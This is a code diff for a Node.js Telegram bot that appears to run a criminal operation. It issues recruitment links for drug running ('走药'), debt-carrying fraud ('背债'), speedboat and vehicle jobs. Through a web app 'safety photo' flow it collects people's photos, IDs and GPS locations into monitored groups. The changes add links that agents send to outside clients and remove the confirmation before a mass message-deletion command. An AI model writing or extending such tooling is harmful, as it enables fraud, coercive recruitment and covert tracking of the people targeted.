@@ -1,9 +1,9 @@
 const { Telegraf } = require('telegraf');
 const fs = require('fs');
 const express = require('express');
-const cors = require('cors'); // 引入 cors 模块，解决前端无法连接的问题
+const cors = require('cors');
 
-// ==================== 全局配置区 ====================
+// ==================== 1. 全局配置区 ====================
 // 解决多实例冲突
 let botInstance = null;
 const bot = new Telegraf(process.env.BOT_TOKEN);
@@ -21,25 +21,26 @@ const GROUP_CHAT_IDS = [
   -1000000000009,
   -1000000000010
 ];
-const BACKUP_GROUP_ID = -1003293673373; // 备份消息群
-const WEB_APP_URL = 'https://huiying8.netlify.app'; // 前端网址
-const AUTH_FILE = './authorized.json'; // 授权数据文件
+const BACKUP_GROUP_ID = -1003293673373; // 备份群ID
+const WEB_APP_URL = 'https://huiying8.netlify.app'; // 你的前端网址
+const AUTH_FILE = './authorized.json'; // 授权文件路径
 const INITIAL_TEXT = '填写招聘申请时请打开手机录屏，按照上面顺序排列填写资料后拍照关闭手机录屏后发送到此群里！';
 
-// 内存数据库
+// 内存数据库 (用于临时存储状态)
 const pendingTasks = new Map();
-let authorizedUsers = new Map();
-const warningMessages = new Map();
+let authorizedUsers = new Map(); // 授权用户列表
+const warningMessages = new Map(); // 警告消息记录
 const unauthorizedMessages = new Map();
-const zlMessages = new Map();
+const zlMessages = new Map(); // 招聘消息记录
 
-// 链接配置
+// 招聘链接配置
 const ZL_LINKS = {
   '租车': 'https://che88.netlify.app',
   '大飞': 'https://fei88.netlify.app',
   '走药': 'https://yao88.netlify.app',
   '背债': 'https://bei88.netlify.app'
 };
+// 中介链接配置
 const ZJ_LINKS = {
   '租车': 'https://zjc88.netlify.app',
   '大飞': 'https://zjf88.netlify.app',
@@ -47,7 +48,7 @@ const ZJ_LINKS = {
   '背债': 'https://zjb88.netlify.app'
 };
 
-// ==================== 工具函数 ====================
+// ==================== 2. 工具函数区 ====================
 
 // 加载授权文件
 function loadAuth() {
@@ -67,6 +68,7 @@ function loadAuth() {
         console.log('授权文件加载失败，使用空Map', error);
     }
 }
+
 // 保存授权文件
 function saveAuth() {
     try {
@@ -75,7 +77,7 @@ function saveAuth() {
         console.error('保存授权失败:', error);
     }
 }
-// 初始化加载
+// 启动时加载
 loadAuth();
 
 // 出厂设置 (清空所有数据)
@@ -100,15 +102,12 @@ async function sendToChat(chatId, photoBuffer, caption, lat, lng) {
     try {
         await bot.telegram.sendPhoto(chatId, { source: photoBuffer }, {
             caption,
-            parse_mode: 'HTML' // 使用 HTML 模式，支持超链接
+            parse_mode: 'HTML' // 使用 HTML 模式以支持点击名字跳转
         });
         
         // 只有当坐标有效且不为 0,0 (测试模式) 时才发送定位
         if (lat && lng && (lat !== 0 || lng !== 0)) {
             await bot.telegram.sendLocation(chatId, lat, lng);
-        } else if (lat === 0 && lng === 0) {
-            // 测试模式下，仅打印日志，不发虚假定位以免误导
-            console.log(`[测试模式] ChatID: ${chatId} 收到图片，无定位数据`);
         }
     } catch (error) {
         console.error(`发送到群 ${chatId} 失败:`, error);
@@ -130,9 +129,9 @@ async function isAdmin(chatId, userId) {
     }
 }
 
-// ==================== Bot 中间件 & 核心逻辑 ====================
+// ==================== 3. Bot 核心逻辑区 ====================
 
-// 私聊拦截保护
+// 中间件：私聊拦截保护
 bot.use(async (ctx, next) => {
     if (ctx.message && ctx.chat?.type === 'private') {
         const userId = ctx.from.id;
@@ -164,15 +163,16 @@ bot.command('bz', (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
     const helpText = `📋汇盈国际官方机器人指令面板\n\n` +
-        `/hc - 换车安全确认拍照 (授权用户专用)\n` +
-        `/boss - Boss 要求指定用户拍照 (汇盈国际负责人专用)\n` +
-        `/lg - 龙哥要求指定用户拍照 (汇盈国际负责人专用)\n` +
-        `/zl - 招聘申请链接生成 (汇盈国际负责人专用)\n` +
-        `/zj - 招聘申请链接生成 (中介链接) (汇盈国际负责人专用)\n` +
-        `/qc - 彻底恢复出厂 (汇盈国际负责人专用)\n` +
-        `/lh - 踢出用户 (汇盈国际负责人专用)\n` +
-        `/lj - 生成当前群组邀请链接 (汇盈国际负责人专用)\n` +
-        `/bz - 显示此说明 (所有用户可用)\n\n`;
+        `/hc - 换车安全确认拍照 (点击直接打开)\n` +
+        `/boss - Boss 要求指定用户拍照 (点击直接打开)\n` +
+        `/lg - 龙哥要求指定用户拍照 (点击直接打开)\n` +
+        `/zjhc - 生成中介换车链接 (发给客户用)\n` +
+        `/zl - 招聘申请链接生成\n` +
+        `/zj - 招聘申请链接生成 (中介链接)\n` +
+        `/qc - 彻底恢复出厂\n` +
+        `/lh - 踢出用户\n` +
+        `/lj - 生成当前群组邀请链接\n` +
+        `/bz - 显示此说明\n\n`;
     ctx.reply(helpText);
 });
 
@@ -201,7 +201,7 @@ bot.command('qc', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
     const isUserAdmin = await isAdmin(chatId, ctx.from.id);
-    if (!isUserAdmin) return ctx.reply('❌ 🔒无权限！ /qc 只限汇盈国际负责人使用。');
+    if (!isUserAdmin) return ctx.reply('❌ 🔒无权限！');
 
     let startMessageId = ctx.message.message_id;
     if (ctx.message.reply_to_message) startMessageId = ctx.message.reply_to_message.message_id;
@@ -211,31 +211,24 @@ bot.command('qc', async (ctx) => {
     // 循环删除消息 (带防死循环逻辑)
     let deletedCount = 0;
     let i = 1;
-    let maxAttempts = 500; // 最多尝试删除500条
+    let maxAttempts = 500; 
     let consecutiveFails = 0;
 
     while (i <= maxAttempts && consecutiveFails < 10) {
         try {
             await bot.telegram.deleteMessage(chatId, startMessageId - i);
             deletedCount++;
-            consecutiveFails = 0; // 成功一次就重置失败计数
+            consecutiveFails = 0;
             i++;
-            await new Promise(r => setTimeout(r, 40)); // 防止触发 Telegram 速率限制
+            await new Promise(r => setTimeout(r, 40)); 
         } catch (error) {
             consecutiveFails++;
             i++; 
         }
     }
     
-    const resetMsg = await ctx.reply(`🔄**一键出厂设置确认**🔄\n\n已尝试清理历史消息。\n此操作将清空所有授权数据，Bot 将恢复初始状态。\n\n点击下方按钮确认：`, {
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: '✅是，重置出厂', callback_data: 'qc_reset_yes' }],
-                [{ text: '❌否，取消', callback_data: 'qc_reset_no' }]
-            ]
-        },
-        parse_mode: 'Markdown'
-    });
+    factoryReset(); // 清除数据
+    ctx.reply(`✅ 出厂设置已完成！数据已重置。`);
 });
 
 // 指令: /zl - 招聘链接
@@ -248,7 +241,6 @@ bot.command('zl', async (ctx) => {
     let targetUserId, targetFirstName, targetUsername;
     const replyTo = ctx.message.reply_to_message;
 
-    // 逻辑：优先检测回复的消息，其次检测 @用户名
     if (replyTo) {
         targetUserId = replyTo.from.id;
         targetFirstName = replyTo.from.first_name || '未知';
@@ -257,8 +249,7 @@ bot.command('zl', async (ctx) => {
         const match = ctx.message.text.match(/@(\w+)/);
         if (match) {
             try {
-                // 尝试从群成员中获取
-                const user = await bot.telegram.getChatMember(chatId, `@${match[1]}`); // 注意这里实际上只能获取已在群内的
+                const user = await bot.telegram.getChatMember(chatId, `@${match[1]}`);
                 targetUserId = user.user.id;
                 targetFirstName = user.user.first_name || '未知';
                 targetUsername = `@${match[1]}`;
@@ -277,12 +268,11 @@ bot.command('zl', async (ctx) => {
                 ]
             }
         });
-        // 存储上下文以便回调使用
         zlMessages.set(replyMsg.message_id, { targetUserId, targetFirstName, targetUsername, commandType: 'zl', chatId });
     } catch (error) { ctx.reply('指令执行失败'); }
 });
 
-// 指令: /zj - 中介链接 (逻辑同 zl)
+// 指令: /zj - 中介链接
 bot.command('zj', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
@@ -343,7 +333,7 @@ bot.command('lh', async (ctx) => {
     } catch (e) { ctx.reply('拉黑失败，请检查Bot权限'); }
 });
 
-// 指令: /boss - Boss 拍照请求
+// 指令: /boss - Boss 拍照请求 (Web App 模式)
 bot.command('boss', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
@@ -358,15 +348,19 @@ bot.command('boss', async (ctx) => {
         return ctx.reply('请回复用户消息');
     }
 
-    const replyMsg = await ctx.reply(`汇盈国际负责人Boss要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
+    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}`;
+
+    const replyMsg = await ctx.reply(`汇盈国际负责人Boss要求你拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
         reply_markup: {
-            inline_keyboard: [[{ text: '📷开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}` }]]
+            inline_keyboard: [[
+                { text: '📷点击拍照', web_app: { url: webAppUrl } }
+            ]]
         },
         parse_mode: 'HTML'
     });
 });
 
-// 指令: /lg - 龙哥拍照请求
+// 指令: /lg - 龙哥拍照请求 (Web App 模式)
 bot.command('lg', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
@@ -381,15 +375,19 @@ bot.command('lg', async (ctx) => {
         return ctx.reply('请回复用户消息');
     }
 
-    const replyMsg = await ctx.reply(`汇盈国际负责人龍哥要求你拍照，请点击下方拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
+    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}`;
+
+    const replyMsg = await ctx.reply(`汇盈国际负责人龍哥要求你拍照 <a href="tg://user?id=${targetUserId}">@${targetUser}</a>`, {
         reply_markup: {
-            inline_keyboard: [[{ text: '📷开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}&uid=${targetUserId}&name=${encodeURIComponent(targetUser)}` }]]
+            inline_keyboard: [[
+                { text: '📷点击拍照', web_app: { url: webAppUrl } }
+            ]]
         },
         parse_mode: 'HTML'
     });
 });
 
-// 指令: /hc - 换车拍照 (需授权)
+// 指令: /hc - 换车拍照 (需授权, Web App 模式)
 bot.command('hc', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
@@ -399,11 +397,39 @@ bot.command('hc', async (ctx) => {
 
     if (!isAuthorized && !isAdminUser) return ctx.reply('无权限，请先让管理员授权');
 
+    const webAppUrl = `${WEB_APP_URL}/?chatid=${chatId}&uid=${userId}&name=${encodeURIComponent(ctx.from.first_name)}`;
+
     await ctx.reply('为了保障你的安全换车前请拍照！', {
         reply_markup: {
-            inline_keyboard: [[{ text: '📷开始拍照', url: `${WEB_APP_URL}/?chatid=${chatId}&uid=${userId}&name=${encodeURIComponent(ctx.from.first_name)}` }]]
+            inline_keyboard: [[
+                { text: '📷开始拍照', web_app: { url: webAppUrl } }
+            ]]
         }
     });
+});
+
+// 指令: /zjhc - 中介换车专属链接
+bot.command('zjhc', async (ctx) => {
+    const chatId = ctx.chat.id;
+    if (!GROUP_CHAT_IDS.includes(chatId)) return;
+    const isUserAdmin = await isAdmin(chatId, ctx.from.id);
+    
+    // 只有管理员或授权中介可用
+    if (!isUserAdmin) return ctx.reply('无权限');
+
+    // 关键逻辑：name 设置为 '中介客户-代理名'
+    const agentId = ctx.from.id;
+    const agentName = ctx.from.first_name;
+    const clientName = `中介客户-${agentName}`; // 这里定义了上传时显示的名字
+    
+    const clientLink = `${WEB_APP_URL}/?chatid=${chatId}&uid=${agentId}&name=${encodeURIComponent(clientName)}`;
+
+    const msg = `🔗 **中介换车专属链接**\n\n` +
+                `请复制下方链接发送给你的客户，让他用浏览器打开拍照：\n\n` +
+                `${clientLink}`;
+    
+    // disable_web_page_preview: true 防止预览挡住视线
+    ctx.reply(msg, { parse_mode: 'Markdown', disable_web_page_preview: true });
 });
 
 // 事件: 新成员进群
@@ -413,10 +439,9 @@ bot.on('new_chat_members', async (ctx) => {
     const newMembers = ctx.message.new_chat_members.filter(m => !m.is_bot);
     
     for (const member of newMembers) {
-        authorizedUsers.set(member.id, false); // 默认未授权
+        authorizedUsers.set(member.id, false);
         saveAuth();
         try {
-            // 进群禁言
             await bot.telegram.restrictChatMember(chatId, member.id, { permissions: { can_send_messages: false } });
         } catch (e) {}
         const warningMsg = await ctx.reply(`🚫欢迎 ${member.first_name}，你没有权限发言，请联系负责人授权！`);
@@ -433,7 +458,7 @@ bot.on('new_chat_members', async (ctx) => {
     });
 });
 
-// 事件: 文本消息处理 (权限管理 + 授权逻辑)
+// 事件: 文本消息 (鉴权与授权)
 bot.on('text', async (ctx) => {
     const chatId = ctx.chat.id;
     if (!GROUP_CHAT_IDS.includes(chatId)) return;
@@ -442,20 +467,18 @@ bot.on('text', async (ctx) => {
     const isAuthorized = authorizedUsers.get(userId);
     const isAdminUser = await isAdmin(chatId, userId);
     
-    // 1. 如果不是管理员且未授权，删除消息并警告
+    // 如果不是管理员且未授权，删除消息
     if (!isAdminUser && !isAuthorized) {
         try { await ctx.deleteMessage(); } catch (e) {}
-        // 防止刷屏，不重复回复
         return; 
     }
 
-    // 2. 管理员回复“授权”处理
+    // 管理员回复“授权”处理
     if (isAdminUser && ctx.message.reply_to_message && ctx.message.text.trim() === '授权') {
         const replyToId = ctx.message.reply_to_message.message_id;
-        // 查找这个消息是否是系统发的警告消息
         let targetData = warningMessages.get(replyToId) || unauthorizedMessages.get(replyToId);
         
-        // 如果找不到记录，尝试直接授权被回复的用户
+        // 如果缓存里没找到，尝试直接获取被回复者的信息
         if (!targetData) {
             targetData = {
                 userId: ctx.message.reply_to_message.from.id,
@@ -468,7 +491,7 @@ bot.on('text', async (ctx) => {
             authorizedUsers.set(targetUserId, true);
             saveAuth();
             
-            // === 核心功能：赋予所有权限 ===
+            // 赋予所有权限
             try {
                 await bot.telegram.restrictChatMember(chatId, targetUserId, {
                     permissions: {
@@ -488,7 +511,6 @@ bot.on('text', async (ctx) => {
                     }
                 });
                 await ctx.reply(`✅已完整授权 ${userName} (ID: ${targetUserId})！\n他现在可以发送图片、定位和消息了。`);
-                // 清理缓存
                 warningMessages.delete(replyToId);
                 unauthorizedMessages.delete(replyToId);
             } catch (error) {
@@ -512,20 +534,10 @@ bot.on('callback_query', async (ctx) => {
             : '上车前要拍照到此群核对...';
         
         try {
-            await ctx.deleteMessage(); // 删除按钮消息
+            await ctx.deleteMessage();
             const newMsg = await ctx.reply(text);
             await bot.telegram.pinChatMessage(chatId, newMsg.message_id);
         } catch (e) {}
-        return ctx.answerCbQuery();
-    }
-
-    // 重置确认
-    if (data === 'qc_reset_yes') {
-        factoryReset();
-        await ctx.editMessageText('出厂设置完成！所有数据已清空。');
-        return ctx.answerCbQuery();
-    } else if (data === 'qc_reset_no') {
-        await ctx.editMessageText('已取消操作。');
         return ctx.answerCbQuery();
     }
     
@@ -544,53 +556,55 @@ bot.on('callback_query', async (ctx) => {
                 ? '点击上方链接打开浏览器进行填写，填写时记住要录屏填写！填写好了发到此群！'
                 : '发给你的客户让客户打开浏览器进行填写，填写时记住要录屏填写！填写好了发到此群！';
 
-             await ctx.editMessageText(`${INITIAL_TEXT}\n\n${userInfo}\n\n申请链接：<a href="${link}">点击进入网站</a>\n\n复制链接: ${link}\n\n${instruction}`, {
+             await ctx.editMessageText(`${INITIAL_TEXT}\n\n${userInfo}\n\n申请链接：<a href="${link}">${buttonKey}链接</a>\n复制链接: ${link}\n\n${instruction}`, {
                  parse_mode: 'HTML',
                  disable_web_page_preview: false
              });
-        } else {
-             await ctx.answerCbQuery('该消息已过期或数据丢失');
         }
         return ctx.answerCbQuery();
     }
+    
+    ctx.answerCbQuery();
 });
 
-// ==================== Express 服务器设置 ====================
+// ==================== 4. Express 服务器区 ====================
 const expressApp = express();
+expressApp.use(cors()); // 允许跨域
+expressApp.use(express.raw({ type: '*/*', limit: '10mb' })); // 处理图片流
 
-// 1. 使用 CORS 模块 (完美解决跨域，允许前端连接)
-expressApp.use(cors());
-
-// 处理 Raw Body (图片数据，最大10mb)
-expressApp.use(express.raw({ type: '*/*', limit: '10mb' }));
-
-// 图片上传接口
+// 图片上传处理接口
 expressApp.post('/upload', async (req, res) => {
   try {
     const photoBuffer = req.body;
-    // 获取参数，允许 lat/lng 为 0 (测试模式)
+    // 获取URL参数
     const { lat, lng, name = '汇盈用户', uid = '未知', time, chatid } = req.query;
     
     if (!chatid) return res.status(400).json({ code: 1, msg: '缺少 chatid' });
     
-    // 转换坐标
     const latitude = parseFloat(lat) || 0;
     const longitude = parseFloat(lng) || 0;
-    // 判断是否为测试模式
     const isTestMode = (latitude === 0 && longitude === 0);
 
     const formattedTime = time ? new Date(parseInt(time)).toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' })
                                 : new Date().toLocaleString('zh-CN', { timeZone: 'Asia/Shanghai' });
     
-    // === 修复 Google 地图链接 (使用 Search API) ===
+    // 地图链接
     const googleMapUrl = `https://www.google.com/maps/search/?api=1&query=${latitude},${longitude}`;
     const amapUrl = `https://amap.com/dir?destination=${longitude},${latitude}`;
     
     let locationText = `位置：${latitude.toFixed(6)}, ${longitude.toFixed(6)}`;
     if (isTestMode) locationText = `位置：(测试模式-无定位)`;
 
-    const caption = `<b>[H5拍照上传]</b>\n` +
-                    `👤用户：${name} (ID:${uid})\n` +
+    // === 核心修改：名字可点击跳转 ===
+    // 使用 HTML 格式： <a href="tg://user?id=123">名字</a>
+    // 注意：uid 如果是 '未知' 则不生成链接
+    let userLink = name;
+    if (uid && uid !== '未知') {
+        userLink = `<a href="tg://user?id=${uid}">${name}</a>`;
+    }
+
+    const caption = `<b>[安全换车照片]</b>\n` +
+                    `👤用户：${userLink} (ID:${uid})\n` +
                     `⏰时间：${formattedTime}\n` +
                     `📍${locationText}\n` +
                     `🗺️<a href="${amapUrl}">高德地图</a> | <a href="${googleMapUrl}">谷歌地图</a>`;
@@ -609,15 +623,12 @@ expressApp.post('/upload', async (req, res) => {
   }
 });
 
-// 探活接口
-expressApp.get('/', (req, res) => res.send('Bot Running... OK!'));
+expressApp.get('/', (req, res) => res.send('Bot Running OK!'));
 
-// 启动服务器
 const PORT = process.env.PORT || 10000;
 expressApp.listen(PORT, () => {
-    console.log(`Express 服务器运行在端口 ${PORT}`);
-    // 启动 Bot
-    bot.launch().then(() => console.log('Telegram Bot 已启动！'));
+    console.log(`Server running on port ${PORT}`);
+    bot.launch().then(() => console.log('Telegram Bot Started!'));
 });
 
 // 优雅退出
